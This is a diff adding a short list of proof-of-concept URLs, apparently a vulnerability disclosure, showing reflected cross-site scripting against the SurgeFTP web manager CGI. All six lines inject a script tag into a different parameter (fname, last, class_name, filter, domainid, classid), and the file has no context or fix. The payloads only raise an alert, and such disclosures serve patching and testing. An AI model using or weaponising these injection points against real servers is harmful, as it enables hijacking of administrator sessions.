@@ -1,0 +1,7 @@
+http://www.example.com/cgi/surgeftpmgr.cgi?cmd=log&domainid=0&fname="<script>alert('XSS');</script>
+http://www.example.com/cgi/surgeftpmgr.cgi?cmd=log&domainid=0&last="<script>alert('XSS');</script>
+http://www.example.com/cgi/surgeftpmgr.cgi?cmd=class&domainid=0&class_name="<script>alert('XSS');</script>
+http://www.example.com/cgi/surgeftpmgr.cgi?cmd=report_file&domainid=0&filter="<script>alert('XSS');</script>
+http://www.example.com/cgi/surgeftpmgr.cgi?cmd=user_admin&domainid="<script>alert('XSS');</script>
+http://www.example.com/cgi/surgeftpmgr.cgi?cmd=class&domainid=0&classid="<script>alert('XSS');</script>
+
